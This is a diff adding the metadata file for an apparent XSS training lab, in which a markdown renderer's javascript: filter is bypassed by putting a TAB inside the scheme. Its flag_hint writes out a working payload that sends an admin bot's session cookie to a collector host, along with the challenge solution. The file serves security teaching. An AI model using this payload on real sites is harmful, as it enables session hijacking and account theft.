@@ -1,0 +1,47 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "markdown-renderer-javascript-uri-bypass",
+  "title": "Markdown Renderer — javascript: URI Filter Bypass",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 35,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise the href context as an XSS sink: a `javascript:` URI in a link runs script when the link is activated, without any angle brackets or event-handler attributes",
+    "Defeat a single-pass, case-insensitive substring filter (`s/javascript://i`) with a control character embedded in the scheme (java<TAB>script:) that the filter does not match but the browser strips on navigation",
+    "Understand why blocklist/strip sanitisers on URLs are the wrong tool — the fix is an allowlist of schemes (http/https/mailto) applied after normalisation",
+    "Deliver an interaction-gated payload: the sink fires only when the victim CLICKS the link, so the exploit depends on the admin bot's click, not just a page load",
+    "Chain the click into cookie theft: the javascript: URI reads the non-HttpOnly session cookie same-origin and beacons it to an out-of-band collector"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["reflected-xss-script-tag-filtered-ladder"],
+  "flag_hint": "POST /pages a markdown link [x](java<TAB>script:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie))) — the literal TAB survives the s/javascript://i strip but the browser removes it on click, so the href runs. The admin bot reviews /admin/review and clicks a.wiki-link, beaconing its session cookie. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "custom markdown link renderer with a single-pass javascript: strip (the flaw)",
+    "@websec-lab/xss-verifier headless-Chromium bot (click delivery)",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "javascript-uri",
+    "href-context",
+    "filter-bypass",
+    "sanitiser-bypass",
+    "control-character",
+    "markdown",
+    "click-delivery",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The GitLab/Discourse-class wiki-markdown javascript:-URI filter-bypass bugs (e.g. the CVE-2022-2185 markdown pipeline pattern), abstracted for local Docker with a Flask renderer, a Playwright admin bot that clicks review links, and an OOB collector"
+}
